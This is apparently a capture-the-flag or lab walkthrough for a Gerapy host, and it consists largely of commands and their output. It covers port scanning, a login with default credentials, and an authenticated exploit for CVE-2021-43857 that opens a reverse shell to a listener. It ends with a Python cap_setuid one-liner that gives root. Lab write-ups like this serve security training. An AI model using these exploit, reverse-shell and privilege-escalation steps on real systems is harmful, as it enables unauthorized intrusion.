## INFORMATION GATHERING
```bash
# IP ADDRESS
192.168.134.24

# HOSTNAME                              // Found post initial Foothold
ubuntu

# OPERATING SYSTEM                      // Found post initial Foothold
cat /etc/*-release     
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=22.04
DISTRIB_CODENAME=jammy
DISTRIB_DESCRIPTION="Ubuntu 22.04 LTS"
PRETTY_NAME="Ubuntu 22.04 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian

# CREDENTIALS                           

```
## OPEN PORTS DETAILS
```bash
22/tcp   open  ssh      syn-ack ttl 61 OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)

8000/tcp open  http-alt syn-ack ttl 61 WSGIServer/0.2 CPython/3.10.6
```
# ENUMERATION
## PORT 8000
```bash
sudo whatweb $url | sed 's/,/\n/g'
http://192.168.134.24:8000 [200 OK] Allow[GET
 OPTIONS]
 Country[RESERVED][ZZ]
 HTML5
 HTTPServer[WSGIServer/0.2 CPython/3.10.6]
 IP[192.168.134.24]
 Script
 Title[Gerapy]
 X-UA-Compatible[IE=edge]

- Found Gerapy 
- able to loginusing default creds admin:admin 

- Found Exploits
Gerapy 0.9.7 - Remote Code Execution (RCE) (Authenticated) | python/remote/50640.py
https://github.com/LongWayHomie/CVE-2021-43857

```
## INITIAL FOOTHOLD
```bash
- Create a project post login or else the exploit will fail 

sudo python3 cve-2021-43857.py -t 192.168.134.24 -p 8000 -L 192.168.45.152 -P 4444
  ______     _______     ____   ___ ____  _       _  _  _____  ___ ____ _____ 
 / ___\ \   / / ____|   |___ \ / _ \___ \/ |     | || ||___ / ( _ ) ___|___  |
| |    \ \ / /|  _| _____ __) | | | |__) | |_____| || |_ |_ \ / _ \___ \  / / 
| |___  \ V / | |__|_____/ __/| |_| / __/| |_____|__   _|__) | (_) |__) |/ /  
 \____|  \_/  |_____|   |_____|\___/_____|_|        |_||____/ \___/____//_/   
                                                                              

Exploit for CVE-2021-43857
For: Gerapy < 0.9.8
[*] Resolving URL...
[*] Logging in to application...
[*] Login successful! Proceeding...
[*] Getting the project list
[*] Found project: test
[*] Getting the ID of the project to build the URL
[*] Found ID of the project:  1
[*] Setting up a netcat listener
listening on [any] 4444 ...
[*] Executing reverse shell payload
[*] Watchout for shell! :)
connect to [192.168.45.152] from (UNKNOWN) [192.168.134.24] 47762
bash: cannot set terminal process group (846): Inappropriate ioctl for device
bash: no job control in this shell
app@ubuntu:~/gerapy$ id
id
uid=1000(app) gid=1000(app) groups=1000(app)
```
## PRIVILEGE ESCALATION
```bash
- Capabilities
/usr/bin/python3.10 cap_setuid=ep                                                                                                                                                            
# GTFOBINS
app@ubuntu:/tmp$ /usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# id
uid=0(root) gid=1000(app) groups=1000(app)
# whoami
root

# root
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.94SVN scan initiated Mon Dec  9 21:54:21 2024 as: /usr/lib/nmap/nmap -p- -sC -sV -vv -oN nmap/scan-script-version 192.168.134.24
Nmap scan report for 192.168.134.24
Host is up, received echo-reply ttl 61 (0.039s latency).
Scanned at 2024-12-09 21:54:23 IST for 114s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 61 OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBYESg2KmNLhFh1KJaN2UFCVAEv6MWr58pqp2fIpCSBEK2wDJ5ap2XVBVGLk9Po4eKBbqTo96yttfVUvXWXoN3M=
|   256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBdIs4PWZ8yY2OQ6Jlk84Ihd5+15Nb3l0qvpf1ls3wfa
8000/tcp open  http-alt syn-ack ttl 61 WSGIServer/0.2 CPython/3.10.6
|_http-server-header: WSGIServer/0.2 CPython/3.10.6
|_http-title: Gerapy
|_http-cors: GET POST PUT DELETE OPTIONS PATCH
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Mon, 09 Dec 2024 16:24:52 GMT
|     Server: WSGIServer/0.2 CPython/3.10.6
|     Content-Type: text/html
|     Content-Length: 9979
|     Vary: Origin
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta http-equiv="content-type" content="text/html; charset=utf-8">
|     <title>Page not found at /nice ports,/Trinity.txt.bak</title>
|     <meta name="robots" content="NONE,NOARCHIVE">
|     <style type="text/css">
|     html * { padding:0; margin:0; }
|     body * { padding:10px 20px; }
|     body * * { padding:0; }
|     body { font:small sans-serif; background:#eee; color:#000; }
|     body>div { border-bottom:1px solid #ddd; }
|     font-weight:normal; margin-bottom:.4em; }
|     span { font-size:60%; color:#666; font-weight:normal; }
|     table { border:none; border-collapse: collapse; width:100%; }
|     vertical-align:top; padding:2px 3px; }
|     width:12em; text-align:right; color:#6
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Mon, 09 Dec 2024 16:24:47 GMT
|     Server: WSGIServer/0.2 CPython/3.10.6
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept, Origin
|     Allow: GET, OPTIONS
|     Content-Length: 2530
|_    <!DOCTYPE html><html lang=en><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=icon href=/favicon.ico><title>Gerapy</title><link href=/static/css/chunk-10b2edc2.79f68610.css rel=prefetch><link href=/static/css/chunk-12e7e66d.8f856d8c.css rel=prefetch><link href=/static/css/chunk-39423506.2eb0fec8.css rel=prefetch><link href=/static/css/chunk-3a6102b3.0fe5e5eb.css rel=prefetch><link href=/static/css/chunk-4a7237a2.19df386b.css rel=prefetch><link href=/static/css/chunk-531d1845.b0b0d9e4.css rel=prefetch><link href=/static/css/chunk-582dc9b0.d60b5161.css rel=prefetch><link href=/static/css/chun
| http-methods: 
|_  Supported Methods: GET OPTIONS
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8000-TCP:V=7.94SVN%I=7%D=12/9%Time=675719CF%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,AAA,"HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2009\x20Dec\x
SF:202024\x2016:24:47\x20GMT\r\nServer:\x20WSGIServer/0\.2\x20CPython/3\.1
SF:0\.6\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nVary:\x20Accept
SF:,\x20Origin\r\nAllow:\x20GET,\x20OPTIONS\r\nContent-Length:\x202530\r\n
SF:\r\n<!DOCTYPE\x20html><html\x20lang=en><head><meta\x20charset=utf-8><me
SF:ta\x20http-equiv=X-UA-Compatible\x20content=\"IE=edge\"><meta\x20name=v
SF:iewport\x20content=\"width=device-width,initial-scale=1\"><link\x20rel=
SF:icon\x20href=/favicon\.ico><title>Gerapy</title><link\x20href=/static/c
SF:ss/chunk-10b2edc2\.79f68610\.css\x20rel=prefetch><link\x20href=/static/
SF:css/chunk-12e7e66d\.8f856d8c\.css\x20rel=prefetch><link\x20href=/static
SF:/css/chunk-39423506\.2eb0fec8\.css\x20rel=prefetch><link\x20href=/stati
SF:c/css/chunk-3a6102b3\.0fe5e5eb\.css\x20rel=prefetch><link\x20href=/stat
SF:ic/css/chunk-4a7237a2\.19df386b\.css\x20rel=prefetch><link\x20href=/sta
SF:tic/css/chunk-531d1845\.b0b0d9e4\.css\x20rel=prefetch><link\x20href=/st
SF:atic/css/chunk-582dc9b0\.d60b5161\.css\x20rel=prefetch><link\x20href=/s
SF:tatic/css/chun")%r(FourOhFourRequest,279E,"HTTP/1\.1\x20404\x20Not\x20F
SF:ound\r\nDate:\x20Mon,\x2009\x20Dec\x202024\x2016:24:52\x20GMT\r\nServer
SF::\x20WSGIServer/0\.2\x20CPython/3\.10\.6\r\nContent-Type:\x20text/html\
SF:r\nContent-Length:\x209979\r\nVary:\x20Origin\r\n\r\n<!DOCTYPE\x20html>
SF:\n<html\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20http-equiv=\"content-
SF:type\"\x20content=\"text/html;\x20charset=utf-8\">\n\x20\x20<title>Page
SF:\x20not\x20found\x20at\x20/nice\x20ports,/Trinity\.txt\.bak</title>\n\x
SF:20\x20<meta\x20name=\"robots\"\x20content=\"NONE,NOARCHIVE\">\n\x20\x20
SF:<style\x20type=\"text/css\">\n\x20\x20\x20\x20html\x20\*\x20{\x20paddin
SF:g:0;\x20margin:0;\x20}\n\x20\x20\x20\x20body\x20\*\x20{\x20padding:10px
SF:\x2020px;\x20}\n\x20\x20\x20\x20body\x20\*\x20\*\x20{\x20padding:0;\x20
SF:}\n\x20\x20\x20\x20body\x20{\x20font:small\x20sans-serif;\x20background
SF::#eee;\x20color:#000;\x20}\n\x20\x20\x20\x20body>div\x20{\x20border-bot
SF:tom:1px\x20solid\x20#ddd;\x20}\n\x20\x20\x20\x20h1\x20{\x20font-weight:
SF:normal;\x20margin-bottom:\.4em;\x20}\n\x20\x20\x20\x20h1\x20span\x20{\x
SF:20font-size:60%;\x20color:#666;\x20font-weight:normal;\x20}\n\x20\x20\x
SF:20\x20table\x20{\x20border:none;\x20border-collapse:\x20collapse;\x20wi
SF:dth:100%;\x20}\n\x20\x20\x20\x20td,\x20th\x20{\x20vertical-align:top;\x
SF:20padding:2px\x203px;\x20}\n\x20\x20\x20\x20th\x20{\x20width:12em;\x20t
SF:ext-align:right;\x20color:#6");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Dec  9 21:56:17 2024 -- 1 IP address (1 host up) scanned in 116.30 seconds

```

